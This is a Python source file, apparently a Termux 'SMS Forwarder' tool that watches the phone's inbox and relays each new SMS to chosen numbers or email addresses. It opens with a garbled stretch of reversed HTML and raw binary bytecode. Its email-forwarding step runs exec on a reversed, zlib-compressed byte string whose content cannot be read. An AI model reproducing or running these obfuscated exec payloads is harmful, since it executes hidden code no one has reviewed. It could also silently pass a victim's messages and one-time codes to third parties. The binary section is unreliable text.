\n>p/<Wz\xff\xff\xff\xfe\xe9\x00\x00\x00\x02\xe9 : morF>p<                        \n>p/<\'z : etaD>p<                        \n#z>dt<                      \n>rt<                    \n>"0"=gnicapsllec "0"=gniddapllec "0"=redrob "noitatneserp"=elor elbat<                  \n>"repparw"=ssalc dt<                \n>rt<              \n>"niam"=ssalc "noitatneserp"=elor elbat<            \n>"niam"=ssalc "noitatneserp"=elor elbat<          \n>"tnetnoc"=ssalc vid<        \n>"reniatnoc"=ssalc dt<      \n>dt/<;psbn&>dt<      \n>rt<    \n>"ydob"=ssalc "0"=gnicapsllec "0"=gniddapllec "0"=redrob "noitatneserp"=elor elbat<  \n>ydob<\n\n>daeh/<\n>elyts/<  \n}    \n}      \n;tnatropmi! e59443# :roloc-redrob        \n;tnatropmi! e59443# :roloc-dnuorgkcab        \n{ revoh:a yramirp-ntb.      \n\n}      \n;tnatropmi! e59443# :roloc-dnuorgkcab        \n{ revoh:dt elbat yramirp-ntb.      \n\n}      \n;tirehni :thgieh-enil        \n;tirehni :thgiew-tnof        \n;tirehni :ylimaf-tnof        \n;tirehni :ezis-tnof        \n;enon :noitaroced-txet        \n;tirehni :roloc        \n{ a ydoBweiVegasseM#      \n\n}      \n;tnatropmi! enon :noitaroced-txet        \n;tnatropmi! tirehni :thgieh-enil        \n;tnatropmi! tirehni :thgiew-tnof        \n;tnatropmi! tirehni :ezis-tnof        \n;tnatropmi! tirehni :ylimaf-tnof        \n;tnatropmi! tirehni :roloc        \n{ a knil-elppa.      \n\n}      \n;%001 :thgieh-enil        \n{ vid ssalClanretxE.      \n,dt ssalClanretxE.      \n,tnof ssalClanretxE.      \n,naps ssalClanretxE.      \n,p ssalClanretxE.      \n,ssalClanretxE.      \n\n}      \n;%001 :htdiw        \n{ ssalClanretxE.      \n{ lla aidem@    \n\n}    \n}      \n;tnatropmi! otua :htdiw        \n;tnatropmi! %001 :htdiw-xam        \n;tnatropmi! otua :thgieh        \n{ evisnopser-gmi. ydob.elbat      \n\n}      \n;tnatropmi! %001 :htdiw        \n{ a ntb. ydob.elbat      \n\n}      \n;tnatropmi! %001 :htdiw        \n{ elbat ntb. ydob.elbat      \n\n}      \n;tnatropmi! 0 :htdiw-thgir-redrob        \n;tnatropmi! 0 :suidar-redrob        \n;tnatropmi! 0 :htdiw-tfel-redrob        \n{ niam. ydob.elbat      \n\n}      \n;tnatropmi! %001 :htdiw        \n;tnatropmi! 0 :gniddap        \n{ reniatnoc. ydob.elbat      \n\n}      \n;tnatropmi! 0 :gniddap        \n{ tnetnoc. ydob.elbat      \n\n}      \n;tnatropmi! xp01 :gniddap        \n{ elcitra. ydob.elbat      \n,repparw. ydob.elbat      \n\n}      \n;tnatropmi! xp61 :ezis-tnof        \n{ a ydob.elbat      \n,naps ydob.elbat      \n,dt ydob.elbat      \n,lo ydob.elbat      \n,lu ydob.elbat      \n,p ydob.elbat      \n\n}      \n;tnatropmi! xp01 :mottob-nigram        \n;tnatropmi! xp82 :ezis-tnof        \n{ 1h ydob.elbat      \n{ )xp026 :htdiw-xam( dna neercs ylno aidem@    \n\n}    \n;0 xp02 :nigram      \n;6f6f6f# dilos xp1 :mottob-redrob      \n;0 :redrob      \n{ rh    \n\n}    \n;enon :noitaroced-txet      \n{ a yb-derewop.    \n\n}    \n;0 :htdiw      \n;neddih :ytilibisiv      \n;neddih :wolfrevo      \n;0 :yticapo      \n;0 :htdiw-xam      \n;0 :thgieh-xam      \n;0 :thgieh      \n;enon :yalpsid      \n;tnerapsnart :roloc      \n{ redaeherp.    \n\n}    \n;0 :mottob-nigram      \n{ 0bm.    \n\n}    \n;0 :pot-nigram      \n{ 0tm.    \n\n}    \n;htob :raelc      \n{ raelc.    \n\n}    \n;tfel :ngila-txet      \n{ tfel-ngila.    \n\n}    \n;thgir :ngila-txet      \n{ thgir-ngila.    \n\n}    \n;retnec :ngila-txet      \n{ retnec-ngila.    \n\n}    \n;0 :pot-nigram      \n{ tsrif.    \n\n}    \n;0 :mottob-nigram      \n{ tsal.    \n\n}    \n;ffffff# :roloc      \n;bd8943# :roloc-redrob      \n;bd8943# :roloc-dnuorgkcab      \n{ a yramirp-ntb.    \n\n}    \n;bd8943# :roloc-dnuorgkcab      \n{ dt elbat yramirp-ntb.    \n\n}    \n;ezilatipac :mrofsnart-txet      \n;enon :noitaroced-txet      \n;xp52 xp21 :gniddap      \n;0 :nigram      \n;dlob :thgiew-tnof      \n;xp41 :ezis-tnof      \n;kcolb-enilni :yalpsid      \n;retniop :rosruc      \n;bd8943# :roloc      \n;xob-redrob :gnizis-xob      \n;xp5 :suidar-redrob      \n;bd8943# xp1 dilos :redrob      \n;ffffff# :roloc-dnuorgkcab      \n{ a ntb.    \n\n}    \n;retnec :ngila-txet      \n;xp5 :suidar-redrob      \n;ffffff# :roloc-dnuorgkcab      \n{ dt elbat ntb.    \n\n}    \n;otua :htdiw      \n{ elbat ntb.    \n\n}    \n;xp51 :mottob-gniddap      \n{ dt>rt>ydobt>ntb.    \n\n}    \n;%001 :htdiw      \n;xob-redrob :gnizis-xob      \n{ ntb.    \n\n}    \n;enilrednu :noitaroced-txet      \n;bd8943# :roloc      \n{ a    \n\n}    \n;xp5 :tfel-nigram      \n;edisni :noitisop-elyts-tsil      \n{ il lo    \n,il lu    \n,il p    \n\n}    \n;xp51 :mottob-nigram      \n;0 :nigram      \n;lamron :thgiew-tnof      \n;xp41 :ezis-tnof      \n;fires-snas :ylimaf-tnof      \n{ lo    \n,lu    \n,p    \n\n}    \n;ezilatipac :mrofsnart-txet      \n;retnec :ngila-txet      \n;003 :thgiew-tnof      \n;xp53 :ezis-tnof      \n{ 1h    \n\n}    \n;xp03 :mottob-nigram      \n;0 :nigram      \n;4.1 :thgieh-enil      \n;004 :thgiew-tnof      \n;fires-snas :ylimaf-tnof      \n;000000# :roloc      \n{ 4h    \n,3h    \n,2h    \n,1h    \n\n}    \n;retnec :ngila-txet      \n;xp21 :ezis-tnof      \n;999999# :roloc      \n{ a retoof.    \n,naps retoof.    \n,p retoof.    \n,dt retoof.    \n\n}    \n;%001 :htdiw      \n;retnec :ngila-txet      \n;xp01 :pot-nigram      \n;htob :raelc      \n{ retoof.    \n\n}    \n;xp01 :pot-gniddap      \n;xp01 :mottob-gniddap      \n{ kcolb-tnetnoc.    \n\n}    \n;xp02 :gniddap      \n;xob-redrob :gnizis-xob      \n{ repparw.    \n\n}    \n;%001 :htdiw      \n;xp3 :suidar-redrob      \n;ffffff# :dnuorgkcab      \n{ niam.    \n\n}    \n;xp01 :gniddap      \n;xp085 :htdiw-xam      \n;otua 0 :nigram      \n;kcolb :yalpsid      \n;xob-redrob :gnizis-xob      \n{ tnetnoc.    \n\n}    \n;xp085 :htdiw      \n;xp01 :gniddap      \n;xp085 :htdiw-xam      \n;tnatropmi! otua 0 :nigram      \n;kcolb :yalpsid      \n{ reniatnoc.    \n\n}    \n;%001 :htdiw      \n;6f6f6f# :roloc-dnuorgkcab      \n{ ydob.    \n\n}    \n;pot :ngila-lacitrev      \n;xp41 :ezis-tnof      \n;fires-snas :ylimaf-tnof      \n{ dt elbat    \n\n}    \n;%001 :htdiw      \n;etarapes :espalloc-redrob      \n{ elbat    \n\n}    \n;%001 :tsujda-ezis-txet-tikbew-      \n;%001 :tsujda-ezis-txet-sm-      \n;0 :gniddap      \n;0 :nigram      \n;4.1 :thgieh-enil      \n;xp41 :ezis-tnof      \n;desailaitna :gnihtooms-tnof-tikbew-      \n;fires-snas :ylimaf-tnof      \n;6f6f6f# :roloc-dnuorgkcab      \n{ ydob    \n\n}    \n;%001 :htdiw-xam      \n;cibucib :edom-noitalopretni-sm-      \n;enon :redrob      \n{ gmi    \n>elyts<  \n>eltit/<redrawroF SMS>eltit<  \n>/ "8-FTU=tesrahc ;lmth/txet"=tnetnoc "epyT-tnetnoC"=viuqe-ptth atem<  \n>/ "0.1=elacs-laitini ,htdiw-ecived=htdiw"=tnetnoc "tropweiv"=eman atem<  \n>daeh<\n\n>lmth<\n>lmth epytcod!<  \n\x00\x00\x18\xa8a*\x01\xda\x00\x00\x00\x04\xe9\x00\xdaN\x1f)\x00S\x00d\x00Y\x00\x01\x03f\x00\x83\x17t\x00\x83\x17t\x01\xa1\x00\x17\n\x9d\x1ed\x00\x9b\x15t\x1dd\x00\x9b\x16t\x18d\x00\x9b\x14t\x1cd\x00\x9b\x1ct\x17d\x00\x9b\x14t\x00\x17\t|\x16d\x13\xa0\x12j\x11t\xe3q\t}\x007\x15d\t|\x06}\x06]\x00D\x01\x83\x00\x18\x14d\x00\x1a\x07d\x00\x18\x07d\x01\x83\x10j\x00\xa1\x0f\xa0\x0et\rt\x00t\t}\x01d\x00\x01\x00\x01\x00\x01\x01w\n~\n}\x00d\x00S\x00d\n~\n}\x00d\x00Y\x00W\x00\x01\x01\x83\x1bd\x17t\x0bz\x00\x01\n}\x00\x01\xcfy\x1bj\x02t\x00\x04\x01w\n~\n}\x00d\x00S\x00d\n~\n}\x00d\x00Y\x00W\x00\x01\x01\x83\x1ad\x17t\x0bz\x00\x01\n}\x00\x01\xb8y\x1aj\x02t\x00\x04\x00S\x00d\x00Y\x00\x01\x00\xa1\x19\xa0\x08|\x00\x01\x00\x01\x00\x01\xa1y\x18t\x00\x04\x00S\x00d\x00W\x00\x01\x03f\x00\x83\x17t\x00\x83\x17t\x01\xa1\x00\x17\t\x9d\x00\x9b\x15t\x19d\x00\x9b\x16t\x18d\x00\x9b\x14t\x03d\x00\x9b\x15t\x17d\x00\x9b\x14t\x00\x17\t|\x16d\x13\xa0\x12j\x11tmq\t}\x007\x15d\t|\x06}\x06]\x00D\x01\x83\x00\x18\x14d\x00\x1a\x07d\x00\x18\x07d\x01\x83\x10j\x00\xa1\x0f\xa0\x0et\rt\x00t\t}\x01d\x00\x01\x03\xa1\x04\x9d\x00\x9b\x07|\x13d\x00\x9b\x01\xa1\x12d\x0c\xa0\x0bt\x11d\x04|\x0ed\n\xa0\x08|\x00\x01\x02\xa1\x01\xa1\x02\xa1\x10d\x01\xa2\x0fd\x00g\t\xa0\x08t\x07\xa0\x01d\x0ed\x06\xa0\x08|\x00\x01\x00\xa1\x05\xa0\x08|\x00\x01\x00\xa1\x04\xa0\x08|\x08}\x02\xa1\rd\x0cd\x03\xa0\x02tez\x07}\x00\x17\t\x9d\x0bd\x00\x9b\x02|\nd\x00\x9b\x03|\td\x00\x9b\x00\x17\x00\x19\x02\x85\x00d\x08d\x01|\x00\x17\x05|\x00\x19\x02\x85\x07d\x00d\x01|\x06d\x00\x9b\x00|\x05d\x04d\nq\x05}\x007\x03d\x05|\x06}\x06]\x00D\x01\x83\x00\x18\x02d\x01\x83\x01|\x01t\x00t\x05}\x01d\x00\x00\x02\x16s\x00\x00\x00C\x00\x00\x00\x10\x00\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05c\x03)\x00S\x02d\x00Z\x00\x84\x01d\x00d\x00\x00\x00\x0cs\x00\x00\x00@\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00cN)\x02\xda\x04exec\xda\x01_\xa9\x00r\x02\x00\x00\x00r\x02\x00\x00\x00\xfa\x03<x>\xda\x08<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x10\x00\x00\x00\'\xc2s\x02)\x00S\x01d\x00\x01\x01\x83\x01\x83\x00d\x01e\x00e\x00\x00\x00\x10s\x00\x00\x00@\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c'))



def SendNumber(to, data):                 # Define a function called SendNumber with two parameters to and data
    def SendNumberCheck(number, data):    # Define a nested function called SendNumberCheck with two parameters number and data
        try:
            subprocess.getoutput(f"termux-sms-send -n {number} {data}")   # Use the subprocess module to send an SMS message to the specified number
            details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t all"))   # Use the subprocess module to get details of the last 10 SMS messages
            for data in details:            # Loop through the details of the messages
                try:
                    if ("".join(data["received"].split(" ")[1].split(":")[:-1]) != time.strftime("%H%M")):  # Check if the received time of the message matches the current time
                        if (data['sender'] == 'You'):      # Check if the sender of the message is the user
                            if (data['type'] == 'failed'):  # Check if the message sending failed
                                return False              # Return False if any of the checks failed
                except: pass
            return True                         # Return True if all checks passed
        except: return False                    # Return False if an exception occurred during message sending or message checking
    if not (SendNumberCheck(to, data)):        # Call the nested function SendNumberCheck with the specified number and data, and check if it returned False
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns).columns) - 2) // 2)-21: finaltxt += " "   # Generate a message to be displayed if message sending failed
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{red}!{magenta}] {white}Could Not Send Message      {yellow}"), print(), print()   # Display the message
    else:                                     # If SendNumberCheck returned True
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns).columns) - 2) // 2)-21: finaltxt += " "   # Generate a message to be displayed if message sending succeeded
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{yellow}*{magenta}] {white}Message Send                {yellow}"), print(), print()  # Display the message

STORE, ID = [], ""
def SendSMS(TO, SVE):
    try:
        global ID
        details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
        for data in details:
            SmsID = data["_id"]
            if (time.strftime("%Y-%m-%d")) == (data["received"].split(" ")[0]) and ("".join(data["received"].split(" ")[1].split(":")[:-1])) == (time.strftime("%H%M")):
                SmsID = str(SmsID)
                if (re.search(SmsID, ID)) : SMSLBAR()
                else:
                    subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s sms received")
                    subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s forwarding message")
                    for to in TO:
                        if (SVE): _ = lambda __ : zlib.decompress(__[::-1]);exec((_)(b'\xf3\x1e\xce\xc7\x00\x13_$\xa4P:\x8afJbjQFIz\x9ep\x95)\xf9I\xf9\xc1)\x16\xa5&\xe6\x95\xe7\xc8\x80Q\xd5\x886\x8c\xd2PRP\xd1,\xc9\xc8.+\xd5\x8aQMK,\xcdNMJ*V\x8cI,IH\xd1\xcc\xccM\xcdqK\xcdN\x0b\x9cx'))
                        else: SendNumber(to, data["body"])
                    ID += SmsID
            else: SMSLBAR()
    except KeyboardInterrupt: EXIT(False)
    except json.decoder.JSONDecodeError :
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{red}!{magenta}] {white}Could Not Send Message      {yellow}"), print(), print()
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def SMSLBAR():
    finaltxt=""
    for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
    sys.stdout.write("\r"+finaltxt+f"{magenta}[{yellow}*{magenta}] {white}Waiting For New Messages...")

def EmailMenu():
    try:
        Banner()
        if not (Internet()):
            print()
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║    {blue}Check your internet connection...     {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║           {blue}Choose An Option...            {red}║",15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║",30)
            center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}TRY AGAIN                  {red}║",30)
            center(f"{red}║         {magenta}[{white}03{magenta}]  {yellow}EXIT                       {red}║",30)
            center(f"{red}╠══════════════════════════════════════════╝",5)
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
            elif (Input == "2") or (Input == "02") or (Input == "two"): EmailMenu()
            elif (Input == "3") or (Input == "03") or (Input == "three"): EXIT()
            else:
                center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║      {blue}Enter emails separated by '{green},{blue}'       {red}║", 25)
            center(f"╠══════════════════════════════════════════╝")
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            Emails = Input.split(",")
            Filter = []
            for email in Emails:
                if (email == ""): continue
                else: Filter.append(email)
            if (len(Filter) == 0): EmailMenu()
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(Box(f"{white}Forwarding SMS To "+str(len(Filter))+" Emails", red+"║   ", " ", red+"  ║", 44, "center", resultprint=False), 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║       {white}For stop press ( {magenta}ctrl + c {white})        {red}║", 25)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print(yellow)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            while True: SendSMS(Filter, True)
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def PHMenu():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║  {blue}Enter mobile numbers separated by '{green},{blue}'   {red}║", 25)
        center(f"╠══════════════════════════════════════════╝")
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        Numbers = Input.split(",")
        Filter = []
        for number in Numbers:
            if (number == ""): continue
            else: Filter.append(number)
        if (len(Filter) == 0): PHMenu()
        else:
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(Box(f"{white}Forwarding SMS To "+str(len(Filter))+" Phone Numbers", red+"║   ", " ", red+"  ║", 44, "center", resultprint=False), 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║       {white}For stop press ( {magenta}ctrl + c {white})        {red}║", 25)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print(yellow)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            while True: SendSMS(Filter, False)
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def MENU():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║           {blue}Choose An Option...            {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝\n",5)
        center(f"{magenta}[{white}01{magenta}]  {yellow}Forward Messages Via Email          ",20)
        center(f"{magenta}[{white}02{magenta}]  {yellow}Forward Messages Via Phone Number   ",20)
        center(f"{magenta}[{white}03{magenta}]  {yellow}About Tool                          ",20)
        center(f"{magenta}[{white}04{magenta}]  {yellow}Usage                               ",20)
        center(f"{magenta}[{white}05{magenta}]  {yellow}Update Tool                         ",20)
        center(f"{magenta}[{white}06{magenta}]  {yellow}More From Us                        ",20)
        center(f"{magenta}[{white}07{magenta}]  {yellow}Exit....                           \n",20)
        center(f"{red}╔═══════════════════════════════════════════",5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): EmailMenu()
        elif (Input == "2") or (Input == "02") or (Input == "two"): PHMenu()
        elif (Input == "3") or (Input == "03") or (Input == "three"): About()
        elif (Input == "4") or (Input == "04") or (Input == "four"): Usage()
        elif (Input == "5") or (Input == "05") or (Input == "five"): Update()
        elif (Input == "6") or (Input == "06") or (Input == "six"): os.system("termux-open-url https://github.com/GreyTechno"), MENU()
        elif (Input == "7") or (Input == "07") or (Input == "seven"): EXIT()
        else: 
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║       {magenta}Invalid Option Try Again...        {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

# line checks whether the current script is being run as the main program or if it has been imported into another script. If it is being run as the main program, the code within the following block will be executed.
if (__name__ == "__main__"):
    sys.stdout.write(f"\r{yellow}Checking Updates...") # prints the message "Checking Updates..." to the console with the text color in yellow.
    # The termux_api() function is called and checks if the Termux API is available on the device. If the API is not available, the Installer() function is called to install the Termux API
    if not (termux_api()): os.system("pip install requests secure-smtplib")
    # If the API is available, Internet() function is called to check if there is an internet connection. If there is an internet connection, CheckVersion() function is called to check for updates.
    else:
        # Finally, if there is no command detected (i.e., cmd() returns False), the MENU() function is called to display the main menu.
        if (Internet()): sys.stdout.write(f"\r{yellow}Checking Updates..."), CheckVersion()
        if not (cmd()): MENU()
